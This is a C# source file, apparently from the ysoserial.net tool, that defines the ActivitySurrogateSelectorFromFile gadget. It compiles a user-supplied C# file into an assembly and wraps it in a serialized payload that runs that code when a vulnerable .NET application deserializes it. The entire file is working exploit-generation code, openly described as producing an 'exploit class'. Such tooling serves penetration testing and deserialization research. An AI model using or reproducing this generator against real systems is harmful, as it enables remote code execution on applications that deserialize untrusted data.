﻿using System;
using System.CodeDom.Compiler;
using System.Configuration;
using System.IO;
using System.Linq;
using System.Runtime.Serialization;

namespace ysoserial.Generators
{
    [Serializable]
    class PayloadClassFromFile : PayloadClass
    {
        protected PayloadClassFromFile(SerializationInfo info, StreamingContext context) : base(info, context)
        {
        }

        public PayloadClassFromFile(string file)
        {
            if(file.StartsWith("cmd /c "))
            {
                file = file.Substring("cmd /c ".Length);
            }
            string[] files = file.Split(new[] { ';' }).Select(s => s.Trim()).ToArray();
            CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");
            CompilerParameters compilerParameters = new CompilerParameters();
            compilerParameters.CompilerOptions = "-t:library -o+";
            compilerParameters.ReferencedAssemblies.AddRange(files.Skip(1).ToArray());
            CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromFile(compilerParameters, files[0]);
            if (compilerResults.Errors.Count > 0)
            {
                foreach (CompilerError error in compilerResults.Errors)
                {
                    Console.Error.WriteLine(error.ErrorText);
                }
                Environment.Exit(-1);
            }
            base.assemblyBytes = File.ReadAllBytes(compilerResults.PathToAssembly);
            File.Delete(compilerResults.PathToAssembly);
        }
    }
    class ActivitySurrogateSelectorFromFileGenerator : ActivitySurrogateSelectorGenerator
    {
        public override string Description()
        {
            return "Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll'.";
        }

        public override string Name()
        {
            return "ActivitySurrogateSelectorFromFile";
        }

        public override string Credit()
        {
            return "James Forshaw";
        }

        public override bool isDerived()
        {
            return false;
        }

        public override object Generate(string file, string formatter, Boolean test, Boolean minify, Boolean useSimpleType)
        {
            PayloadClassFromFile payload = new PayloadClassFromFile(file);
            return Serialize(payload, formatter, test, minify, useSimpleType);
        }
    }
}
